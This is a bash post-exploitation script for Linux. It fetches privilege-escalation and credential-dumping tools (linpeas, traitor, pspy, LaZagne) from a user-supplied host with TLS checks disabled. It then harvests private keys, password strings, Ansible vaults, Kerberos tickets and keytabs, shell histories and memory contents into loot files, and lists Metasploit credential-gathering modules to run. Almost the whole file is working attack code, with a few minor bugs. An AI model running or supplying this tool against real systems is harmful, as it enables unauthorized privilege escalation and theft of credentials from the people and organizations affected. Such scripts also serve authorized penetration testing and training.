#!/bin/bash
### CREATED BY KARMAZ
while getopts "elu:" OPTION; do
    case $OPTION in
    e)
        escalation_on=1
        ;;
    l)
        looting_on=1
        ;;
    u)
        server_url=$OPTARG
        ;;
    *)
        echo "You must specify the server url flag.
    USAGE: ./lisp.sh -e -l -u http://127.0.0.1/

        # -e => PRIVILEGE ESCALATION
        # -l => LOOTING
        # -u => HOST WITH TOOLS"
        exit 1
        ;;
    esac
done
if [ -z "$server_url" ]
then
echo "$server_url"
echo "You must specify the server url flag.
USAGE: ./lisp.sh -e -l -u http://127.0.0.1/
            
        # -e => PRIVILEGE ESCALATION
        # -l => LOOTING
        # -u => HOST WITH TOOLS"
exit 1
else
    if command -v wget &> /dev/null
    then
        wget_found=1
    elif command -v curl &> /dev/null
    then
        curl_found=1
    else
        echo "Install wget | curl to make the script work."
        exit 1
    fi
mkdir blood
fi

download_tools() {
    kernel_arch=$(uname -m)
    cd blood || exit
    if [ "$wget_found" == 1 ]
    then
        wget --no-check-certificate -q "$server_url/tools/linpeas.sh"
        wget --no-check-certificate -q "$server_url/tools/les.sh"
        wget --no-check-certificate -q "$server_url/tools/nmap.zip"
        if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
        then
            wget --no-check-certificate -q "$server_url/tools/traitor-amd64"
            wget --no-check-certificate -q "$server_url/tools/pspy64"
            wget --no-check-certificate -q "$server_url/tools/lazagne64"
        else
            wget --no-check-certificate -q "$server_url/tools/traitor-386"
            wget --no-check-certificate -q "$server_url/tools/pspy32"
            wget --no-check-certificate -q "$server_url/tools/lazagne32"
        fi
    elif [ "$curl_found" == 1 ]
    then
        curl -s -k "$server_url/tools/linpeas.sh" -o linpeas.sh
        curl -s -k "$server_url/tools/les.sh" -o les.sh
        curl -s -k "$server_url/tools/nmap.zip" -o nmap.zip
        if [ "$kernel_arch" == "x86_64" ] || [ "$kernel_arch" == "x64" ]
        then
            curl -s -k "$server_url/tools/traitor-amd64" -o pspy64 traitor-amd64
            curl -s -k "$server_url/tools/pspy64" -o pspy64
            curl -s -k "$server_url/tools/lazagne64" -o lazagne64
        else
            curl -s -k "$server_url/tools/traitor-386" -o traitor-386
            curl -s -k "$server_url/tools/pspy32" -o pspy32
            curl -s -k "$server_url/tools/lazagne32" -o lazagne32
        fi
    fi
    unzip -qq nmap.zip
    chmod +x linpeas.sh les.sh traitor* pspy* lazagne*
}

looting() {
    cd loot
    ./lazagne* all | tee -a loot/lazagne.txt
    echo "======================= POSSIBLE PRIV KEYS:" | tee -a loot/priv_keys.txt
    grep -r -a "PRIVATE KEY-----" / 2>/dev/null | tee -a loot/priv_keys.txt
    echo "======================= POSSIBLE ANSBILE VAULT:" | tee -a loot/ansible_vault.txt
    grep -r -a "\!vault" / 2>/dev/null  | tee -a loot/ansible_vault.txt
    echo "======================="
    echo "CHECK THESE LOCATIONS" | tee -a loot/files_to_check.txt
    echo "======================= AUTH LOGS:" | tee -a loot/files_to_check.txt
    find / -name auth.log 2>/dev/null | tee -a loot/files_to_check.txt
    echo "======================= DIRECTORY LISTERNING OF THE: /var/log" | tee -a loot/files_to_check.txt
    ls /var/log | tee -a loot/var_log_directory_list.txt
    echo "======================= CONFIG FILES (config.php!):" | tee -a loot/files_to_check.txt
    locate .config | tee -a loot/files_to_check.txt
    locate config. | tee -a loot/files_to_check.txt
    echo "======================= HISTORY FILES (.bash_history!):" | tee -a loot/files_to_check.txt
    find / -name "*_history" -xdev 2>/dev/null | loot/files_to_check.txt
    echo "======================= PASSWORD FILES:" | tee -a loot/files_to_check.txt
    locate password | tee -a loot/files_to_check.txt
    echo "======================= OLD PASSWORDS:" | tee -a loot/files_to_check.txt
    find / -name opasswd -xdev 2>/dev/null | tee -a loot/files_to_check.txt
    echo "======================= GNOME KEYRING - cracking:" | tee -a loot/files_to_check.txt
    locate login.keyring; locate user.keystore | tee -a loot/files_to_check.txt
    echo "======================= /etc/fstab:" | tee -a loot/files_to_check.txt
    locate /etc/fstab | tee -a loot/files_to_check.txt
    echo "======================= PLAIN TEXT PASSWORDS:" | tee -a loot/plain_text_pass.txt
    grep --color=auto -rnw '/' -ie "PASSWORD\|PASSWD" --color=always 2> /dev/null | tee -a loot/plain_text_pass.txt
    echo "======================= KERBEROS - CACHE" | tee -a loot/kerberos.txt
    env | grep KRB5CCNAME | tee -a loot/kerberos.txt
    find / -name "krb5cc_*" 2>/dev/null
    echo "======================= KERBEROS - CURRENT TICKETS" | tee -a loot/kerberos.txt
    klist | tee -a loot/kerberos.txt
    echo "======================= KERBEROS - KEYTABS" | tee -a loot/kerberos.txt
    find / -name "*.keytab" 2>/dev/null | tee -a loot/kerberos.txt
    echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
run post/linux/gather/hashdump
run post/multi/gather/lastpass_creds
run post/linux/gather/phpmyadmin_credsteal
run post/linux/gather/pptpd_chap_secrets
run post/multi/gather/filezilla_client_cred
run post/multi/gather/firefox_creds
run post/multi/gather/maven_creds
run post/multi/gather/netrc_creds
run post/multi/gather/remmina_creds
run post/multi/gather/pgpass_creds
run post/multi/gather/rsyncd_creds
run post/multi/gather/ssh_creds
======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
[*] BROWSER
[*] DATABASES
[*] USERS'S FILES"
    echo "======================= CREDS IN MEMORY - it will take a moment ..." | tee -a loot/creds_in_memory.txt
    strings /dev/mem -n10 | grep --color=always -ie "PASSWORD|PASSWD" | tee -a loot/creds_in_memory.txt
}

escalation() {
    mkdir priv
    echo "======================= PTES => http://www.pentest-standard.org/index.php/Post_Exploitation"
    ./linpeas.sh -a | tee -a priv/linpeas.txt
    ./les.sh | tee -a priv/les.txt
    ./traitor* | tee -a priv/traitor.txt
    echo "======================= ADDITIONAL MSF MODULES - DO NOT FORGET:
run post/linux/gather/enum_system
run post/linux/gather/enum_configs
run post/linux/gather/enum_users_history
======================= ADDITIONAL MANUAL CHECKS & DOUBLE CHECKS:
[*] BROWSER:
    - Browser History
    - Bookmarks
    - Download History
    - Credentials
    - Proxies
    - Plugins/Extensions
[*] INTRESTING DOCUMENTS:
    - /home/<user>
    - .doc
    - .xls
    - .bash_history
    - .bashrc
[*] DATABASES
[*] INTERNAL PORT SCANNING
[*] PORT FORWARDING"
    ./pspy* | tee -a priv/pspy.txt
}

download_tools
if [ $escalation_on == 1 ]
then 
    escalation
fi

if [ $looting_on == 1 ]
then 
    looting
fi